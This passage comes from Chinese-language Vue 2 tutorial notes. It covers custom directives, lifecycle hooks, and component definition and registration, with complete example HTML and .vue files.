		</style>
	</head>
	<body>
		<button id="btn">点我创建一个输入框</button>
		
		<script type="text/javascript" >
			const btn = document.getElementById('btn')
			btn.onclick = ()=>{
				const input = document.createElement('input')

				input.className = 'demo'
				input.value = 99
				input.onclick = ()=>{alert(1)}
				
				document.body.appendChild(input)

				input.focus()
				// input.parentElement.style.backgroundColor = 'skyblue'
				console.log(input.parentElement)
				
			}
		</script>
	</body>
</html>
```

## 自定义指令

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>自定义指令</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 
        需求1：定义一个v-big指令，和v-text功能类似，但会把绑定的数值放大10倍。
        需求2：定义一个v-fbind指令，和v-bind功能类似，但可以让其所绑定的input元素默认获取焦点。
        自定义指令总结：
                一、定义语法：
                            (1).局部指令：
                                        new Vue({															new Vue({
                                            directives:{指令名:配置对象}   或   		directives{指令名:回调函数}
                                        }) 																		})
                            (2).全局指令：
                                            Vue.directive(指令名,配置对象) 或   Vue.directive(指令名,回调函数)

                二、配置对象中常用的3个回调：
                            (1).bind：指令与元素成功绑定时调用。
                            (2).inserted：指令所在元素被插入页面时调用。
                            (3).update：指令所在模板结构被重新解析时调用。

                三、备注：
                            1.指令定义时不加v-，但使用时要加v-；
                            2.指令名如果是多个单词，要使用kebab-case命名方式，不要用camelCase命名。
		-->
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>{{name}}</h2>
			<h2>当前的n值是：<span v-text="n"></span> </h2>
			<!-- <h2>放大10倍后的n值是：<span v-big-number="n"></span> </h2> -->
			<h2>放大10倍后的n值是：<span v-big="n"></span> </h2>
			<button @click="n++">点我n+1</button>
			<hr/>
			<input type="text" v-fbind:value="n">
		</div>
	</body>
	
	<script type="text/javascript">
		Vue.config.productionTip = false

		//定义全局指令
		/* Vue.directive('fbind',{
			//指令与元素成功绑定时（一上来）
			bind(element,binding){
				element.value = binding.value
			},
			//指令所在元素被插入页面时
			inserted(element,binding){
				element.focus()
			},
			//指令所在的模板被重新解析时
			update(element,binding){
				element.value = binding.value
			}
		}) */

		new Vue({
			el:'#root',
			data:{
				name:'尚硅谷',
				n:1
			},
			directives:{
				//big函数何时会被调用？1.指令与元素成功绑定时（一上来）。2.指令所在的模板被重新解析时。
				/* 'big-number'(element,binding){
					// console.log('big')
					element.innerText = binding.value * 10
				}, */
				big(element,binding){
					console.log('big',this) //注意此处的this是window
					// console.log('big')
					element.innerText = binding.value * 10
				},
				fbind:{
					//指令与元素成功绑定时（一上来）
					bind(element,binding){
						element.value = binding.value
					},
					//指令所在元素被插入页面时
					inserted(element,binding){
						element.focus()
					},
					//指令所在的模板被重新解析时
					update(element,binding){
						element.value = binding.value
					}
				}
			}
		})
		
	</script>
</html>
```

# 生命周期

![生命周期](vue_basic.assets/生命周期.png)

## 引出生命周期

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script type='text/javascript' src="../js/vue.js"></script>
    <style>
    </style>
</head>
<body>

    <!-- 
        生命周期：
                1.又名：生命周期回调函数、生命周期函数、生命周期钩子。
                2.是什么：Vue在关键时刻帮我们调用的一些特殊名称的函数。
                3.生命周期函数的名字不可更改，但函数的具体内容是程序员根据需求编写的。
                4.生命周期函数中的this指向是vm 或 组件实例对象。
    -->


    <!-- 准备好一个容器 -->
    <div id="root">
        <h2 v-if="a">你好啊</h2>
        <h2 :style="{opacity}">欢迎学习Vue</h2>
    </div>

    <script>
        Vue.config.productionTip = false;//设置为 false 以阻止 vue 在启动时生成生产提示

        new Vue({
            el:'#root',
            data:{
                opacity:1,
                a:false
            },
            //Vue完成模板的解析并把初始的真实dom元素放入页面后（挂载完毕）调用mounted
            mounted() {
                this.a = true;
                setInterval(() => {
                    this.opacity -= 0.01;
                    if(this.opacity <= 0) this.opacity = 1;
                }, 16);
            },
        })


        //通过外部定时器实现，不推荐
        // setInterval(() => {
        //     vm.opacity -= 0.01;
        //     if(this.opacity <= 0) this.opacity = 1;
        // }, 16);
    </script>


    
</body>
</html>
```

## 分析生命周期

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script type='text/javascript' src="../js/vue.js"></script>
    <style>
    </style>
</head>
<body>

    <!-- 准备好一个容器 -->
    <div id="root">
        <h2>当前的n值是：{{n}}</h2>
        <button @click="add">点我n+1</button>
        <button @click="bye">点我销毁vm</button>
    </div>

    <script>
        Vue.config.productionTip = false;//设置为 false 以阻止 vue 在启动时生成生产提示

        new Vue({
            el:'#root',
            data:{
                n:1
            },
            methods: {
                add(){
                    this.n++;
                },
                bye(){
                    console.log('bye');
                    this.$destroy();
                }
            },
            beforeCreate() {
                console.log('beforeCreate');
            },
            created() {
                console.log('created');
            },
            beforeMount() {
                console.log('beforeMount');
            },
            mounted() {
                console.log('mounted');
            },
            beforeUpdate() {
                console.log('beforeUpdate');
            },
            updated() {
                console.log('updated');
            },
            beforeDestroy() {
                console.log('beforeDestroy');
            },
            destroyed() {
                console.log('destroyed');
            },
        })
    </script>


    
</body>
</html>
```

## 总结生命周期

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script type='text/javascript' src="../js/vue.js"></script>
    <style>
    </style>
</head>
<body>
    <!-- 
        常用的生命周期钩子：
                1.mounted: 发送ajax请求、启动定时器、绑定自定义事件、订阅消息等【初始化操作】。
                2.beforeDestroy: 清除定时器、解绑自定义事件、取消订阅消息等【收尾工作】。

        关于销毁Vue实例
                1.销毁后借助Vue开发者工具看不到任何信息。
                2.销毁后自定义事件会失效，但原生DOM事件依然有效。
                3.一般不会在beforeDestroy操作数据，因为即便操作数据，也不会再触发更新流程了。
    -->

    <!-- 准备好一个容器 -->
    <div id="root">
        <h2 :style="{opacity}">欢迎学习Vue</h2>
        <button @click="stop">点我停止变换</button>
        <button @click="opacity = 1">点我透明度设置为1</button>
    </div>

    <script>
        Vue.config.productionTip = false;//设置为 false 以阻止 vue 在启动时生成生产提示

        new Vue({
            el:'#root',
            data:{
                opacity:1,
            },
            //Vue完成模板的解析并把初始的真实dom元素放入页面后（挂载完毕）调用mounted
            mounted() {
                this.a = true;
                this.timer = setInterval(() => {
                    this.opacity -= 0.01;
                    if(this.opacity <= 0) this.opacity = 1;
                }, 16);
            },
            methods: {
                stop(){
                    this.$destroy();
                }
            },
            beforeDestroy() {
                console.log('vm即将去逝');
                clearInterval(this.timer);
            },
        })
       
    </script>


    
</body>
</html>
```

![image-20220220135406404](vue_basic.assets/image-20220220135406404.png)

# 非单文件组件

## 1_基本使用

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script type='text/javascript' src="../js/vue.js"></script>
    <style>
    </style>
</head>
<body>

    <!-- 
        Vue中使用组件的三大步骤：
                一、定义组件(创建组件)
                二、注册组件
                三、使用组件(写组件标签)

        一、如何定义一个组件？
                    使用Vue.extend(options)创建，其中options和new Vue(options)时传入的那个options几乎一样，但也有点区别；
                    区别如下：
                            1.el不要写，为什么？ ——— 最终所有的组件都要经过一个vm的管理，由vm中的el决定服务哪个容器。
                            2.data必须写成函数，为什么？ ———— 避免组件被复用时，数据存在引用关系。
                    备注：使用template可以配置组件结构。

        二、如何注册组件？
                        1.局部注册：靠new Vue的时候传入components选项
                        2.全局注册：靠Vue.component('组件名',组件)

        三、编写组件标签：
                        <school></school>
    -->


    <!-- 准备好一个容器 -->
    <div id="root">
        <!-- 第三步：编写组件标签 -->
        <shool></shool>
        <hr>
        <student></student>
        <hr>
        <hello></hello>
    </div>

    <div id="root2">
        <hello></hello>
    </div>

    <script>
        Vue.config.productionTip = false;//设置为 false 以阻止 vue 在启动时生成生产提示

        //第一步：创建shool组件
        const shool = Vue.extend({
            // el:'#root', //组件定义时，一定不要写el配置项，因为最终所有的组件都要被一个vm管理，由vm决定服务于哪个容器
            data(){
                return{
                    shoolName:'尚硅谷',
                    address:'北京',
                }
            },
            template: `
            <div>
                <h2>学校名称：{{shoolName}}</h2>
                <h2>学校地址：{{address}}</h2>
                <button @click="showName">点我提示学校名</button>
            </div>`,
            methods: {
                showName(){
                    alert(this.shoolName);
                }
            },
        });

        //第一步：创建shool组件
        const student = Vue.extend({
            data(){
                return{
                    studentName:'张三',
                    age:18
                }
            },
            template:`
            <div>
                <h2>学生姓名：{{studentName}}</h2>
                <h2>学生年龄：{{age}}</h2>
            </div>`
        });

        //第一步：创建hello组件
        const hello = Vue.extend({
            template:`
            <div>
                <h2>你好啊{{name}}</h2>
            </div>
            `,
            data(){
                return{
                    name: 'Tom'
                }
            }
        })

        //第二步：全局注册组件
        Vue.component('hello',hello);

        //创建vm
        new Vue({
            el:'#root',
            //第二步：注册组件（局部注册）
            components:{
                shool,
                student
            }
        })

        new Vue({
            el:'#root2'
        })

        

        

    </script>


    
</body>
</html>
```

![image-20220220135541815](vue_basic.assets/image-20220220135541815.png)

## 2_几个注意点

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script type='text/javascript' src="../js/vue.js"></script>
    <style>
    </style>
</head>
<body>

    <!-- 
        Vue中使用组件的三大步骤：
                一、定义组件(创建组件)
                二、注册组件
                三、使用组件(写组件标签)

        一、如何定义一个组件？
                    使用Vue.extend(options)创建，其中options和new Vue(options)时传入的那个options几乎一样，但也有点区别；
                    区别如下：
                            1.el不要写，为什么？ ——— 最终所有的组件都要经过一个vm的管理，由vm中的el决定服务哪个容器。
                            2.data必须写成函数，为什么？ ———— 避免组件被复用时，数据存在引用关系。
                    备注：使用template可以配置组件结构。

        二、如何注册组件？
                        1.局部注册：靠new Vue的时候传入components选项
                        2.全局注册：靠Vue.component('组件名',组件)

        三、编写组件标签：
                        <school></school>
    -->


    <!-- 准备好一个容器 -->
    <div id="root">
        <!-- 第三步：编写组件标签 -->
        <shool></shool>
        <hr>
        <student></student>
        <hr>
        <hello></hello>
    </div>

    <div id="root2">
        <hello></hello>
    </div>

    <script>
        Vue.config.productionTip = false;//设置为 false 以阻止 vue 在启动时生成生产提示

        //第一步：创建shool组件
        const shool = Vue.extend({
            // el:'#root', //组件定义时，一定不要写el配置项，因为最终所有的组件都要被一个vm管理，由vm决定服务于哪个容器
            data(){
                return{
                    shoolName:'尚硅谷',
                    address:'北京',
                }
            },
            template: `
            <div>
                <h2>学校名称：{{shoolName}}</h2>
                <h2>学校地址：{{address}}</h2>
                <button @click="showName">点我提示学校名</button>
            </div>`,
            methods: {
                showName(){
                    alert(this.shoolName);
                }
            },
        });

        //第一步：创建shool组件
        const student = Vue.extend({
            data(){
                return{
                    studentName:'张三',
                    age:18
                }
            },
            template:`
            <div>
                <h2>学生姓名：{{studentName}}</h2>
                <h2>学生年龄：{{age}}</h2>
            </div>`
        });

        //第一步：创建hello组件
        const hello = Vue.extend({
            template:`
            <div>
                <h2>你好啊{{name}}</h2>
            </div>
            `,
            data(){
                return{
                    name: 'Tom'
                }
            }
        })

        //第二步：全局注册组件
        Vue.component('hello',hello);

        //创建vm
        new Vue({
            el:'#root',
            //第二步：注册组件（局部注册）
            components:{
                shool,
                student
            }
        })

        new Vue({
            el:'#root2'
        })

        

        

    </script>


    
</body>
</html>
```

## 3_组件的嵌套

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script type='text/javascript' src="../js/vue.js"></script>
    <style>
    </style>
</head>
<body>


    <!-- 准备好一个容器 -->
    <div id="root">
        <app></app>
    </div>

    <script>
        Vue.config.productionTip = false;//设置为 false 以阻止 vue 在启动时生成生产提示

        //定义student组件
        const student = Vue.extend({
            template:`
            <div>
                <h2>学生名称：{{studentName}}</h2>
                <h2>学生年龄：{{age}}</h2>
            </div>
            `,
            data(){
                return{
                    studentName:'tom',
                    age:18,
                }
            }
        })

        //定义shool组件
        const shool = Vue.extend({
            template:`
            <div>
                <h2>学校名称：{{shoolName}}</h2>
                <h2>学校地址：{{address}}</h2>
                <student></student>
            </div>
            `,
            data(){
                return{
                    shoolName:'尚硅谷',
                    address:'北京',
                }
            },
            components:{
                student
            }
        })

        //定义hello组件
        const hello = Vue.extend({
            template: `<h1>{{msg}}</h1>`,
            data(){
                return{
                    msg: '欢迎来到尚硅谷学习！'
                }
            }
        })


        //定义app组件
        const app = Vue.extend({
            components:{
                shool,
                hello
            },
            template:`
            <div>
                <hello></hello>
                <shool></shool>
            </div>
            `
        })

        



        new Vue({
            el:'#root',
            components:{
                app
            }
        })
    </script>


    
</body>
</html>
```

![image-20220220135705198](vue_basic.assets/image-20220220135705198.png)

## 4_VueComponent

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script type='text/javascript' src="../js/vue.js"></script>
    <style>
    </style>
</head>
<body>

    <!-- 
    关于VueComponent：
                1.school组件本质是一个名为VueComponent的构造函数，且不是程序员定义的，是Vue.extend生成的。

                2.我们只需要写<school/>或<school></school>，Vue解析时会帮我们创建school组件的实例对象，
                    即Vue帮我们执行的：new VueComponent(options)。

                3.特别注意：每次调用Vue.extend，返回的都是一个全新的VueComponent！！！！

                4.关于this指向：
                        (1).组件配置中：
                                    data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【VueComponent实例对象】。
                        (2).new Vue(options)配置中：
                                    data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【Vue实例对象】。

                5.VueComponent的实例对象，以后简称vc（也可称之为：组件实例对象）。
                    Vue的实例对象，以后简称vm。
    -->


    <!-- 准备好一个容器 -->
    <div id="root">
        <shool></shool>
        <hello></hello>
    </div>

    <script>
        Vue.config.productionTip = false;

        //定义shool组件
        const shool = Vue.extend({
            template:`
            <div>
                <h2>学校名称：{{shoolName}}</h2>
                <h2>学校地址：{{address}}</h2>
                <button @click="showName">点我提示学校信息</button>
            </div>
            `,
            data(){
                return{
                    shoolName:'尚硅谷',
                    address:'北京',
                }
            },
            methods: {
                showName(){
                    alert(this.shoolName);
                }
            },
        })

        const test = Vue.extend({
            template:`<span>atguigu</span>`
        })

        //定义Hello组件
        const hello = Vue.extend({
            template: `
            <div>
                <h2>{{msg}}</h2>
                <test/>
            </div>`,
            data(){
                return{
                    msg: '你好啊！'
                }
            },
            components: {
                test
            }
        })


        

        console.log('@',shool);
        console.log('#',hello);
        console.log(shool === hello);



        //创建vm
        new Vue({
            el:'#root',
            components:{
                shool,
                hello
            }
        })

    </script>


    
</body>
</html>
```

![image-20220220135730666](vue_basic.assets/image-20220220135730666.png)

## 5_一个重要的内置关系

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script type='text/javascript' src="../js/vue.js"></script>
    <style>
    </style>
</head>
<body>

    <!-- 
        1.一个重要的内置关系：VueComponent.prototype.__proto__ === Vue.prototype
        2.为什么要有这个关系：让组件实例对象（vc）可以访问到 Vue原型上的属性、方法。
    -->


    <!-- 准备好一个容器 -->
    <div id="root">
        <shool></shool>
    </div>

    <script>
        Vue.config.productionTip = false;//设置为 false 以阻止 vue 在启动时生成生产提示
        Vue.prototype.x = 99;

        

        //定义shool组件
        const shool = Vue.extend({
            template:`
            <div>
                <h2>学校名称：{{shoolName}}</h2>
                <h2>学校地址：{{address}}</h2>
                <button @click="showX">点我输出x</button>
            </div>
            `,
            data(){
                return{
                    shoolName:'尚硅谷',
                    address:'北京',
                }
            },
            methods: {
                showX(){
                    console.log(this.x);
                }
            },
        })

        const vm = new Vue({
            el:'#root',
            data:{
                
            },
            components:{
                shool
            }
        })

        console.log(shool.prototype.__proto__ === Vue.prototype);

        //定义一个构造函数
        // function Demo(){
        //     this.a = 1;
        //     this.b = 2;
        // }

        // //创建一个demo的实例对象
        // const d = new Demo();

        // console.log(Demo.prototype);//显示原型属性
        // console.log(d.__proto__);//隐式原型属性

        // console.log(Demo.prototype === d.__proto__);

        // //通过显示原型属性操作原型对象，追加一个x属性
        // Demo.prototype.x = 99;

        // console.log('@',d);
    </script>


    
</body>
</html>
```

![Snipaste_2022-02-17_16-22-33](vue_basic.assets/Snipaste_2022-02-17_16-22-33.png)

# 单文件组件

## App.vue

```html
<template>
    <div>
        <Shool></Shool>
        <Student></Student>
    </div>
</template>

<script>
    //引入组件
    import Shool from './Shool.vue'
    import Student from './Student.vue'

    export default {
        name:'app',
        components:{
            Shool,
            Student
        }
    }
</script>

<style>

</style>
```

## index.html

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>单文件组件</title>
</head>
<body>

    <!-- 准备一个容器 -->
    <div id="root">
        <App></App>
    </div>
    
    <script src="../js/vue.js"></script>
    <script src="./main.js"></script>

</body>
</html>
```

## main.js

```js
import App from './App.vue'

new Vue({
    el:'#root',
    components:{
        App
    }
})
```

## Shool.vue

```vue
<template>
    <!-- 组件的结构 -->
   <div class="demo">
        <h2>学校名称：{{shoolName}}</h2>
        <h2>学校地址：{{address}}</h2>
        <button @click="showName">点我提示学校名</button>
   </div>

</template>

<script>
    // 组件交互相关的代码
    export default {
        // el:'#root', //组件定义时，一定不要写el配置项，因为最终所有的组件都要被一个vm管理，由vm决定服务于哪个容器
        name:'Shool',
        data(){
            return{
                shoolName:'尚硅谷',
                address:'北京',
            }
        },
        methods: {
            showName(){
                alert(this.shoolName);
            }
        }
    }
</script>

<style>
/* 组件的样式 */
    .demo {
        background-color: orange;
    }

</style>
```

## Student.vue

```html
<template>
    <!-- 组件的结构 -->
   <div class="demo">
        <h2>学生姓名：{{name}}</h2>
        <h2>学生年龄：{{age}}</h2>
   </div>

</template>

<script>
    // 组件交互相关的代码
    export default {
        // el:'#root', //组件定义时，一定不要写el配置项，因为最终所有的组件都要被一个vm管理，由vm决定服务于哪个容器
        name:'Student',
        data(){
            return{
                name:'张三',
                age:18,
            }
        }
    }
</script>

<style>
/* 组件的样式 */
</style>
```
